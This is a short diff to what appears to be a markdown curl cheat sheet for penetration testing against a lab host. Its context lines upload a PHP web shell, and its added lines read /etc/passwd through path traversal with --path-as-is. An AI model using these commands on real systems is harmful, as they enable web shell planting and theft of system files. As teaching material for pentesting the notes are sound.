@@ -37,4 +37,14 @@ curl -X POST -F "file=@shell.php;type=application/php;filename=shell.php" http:/
 curl -X POST -F 'file=<shell.zip' http://10.10.11.10/upload
 ```
 
+```bash
+# Not to handle sequences of /../ or /./ in the given URL
+curl --path-as-is http://10.10.11.10/../../../../etc/passwd
+```
+
+```bash
+# Save the same name as the file on the server
+curl http://10.10.11.10/filt.txt -O
+```
+
 <br>
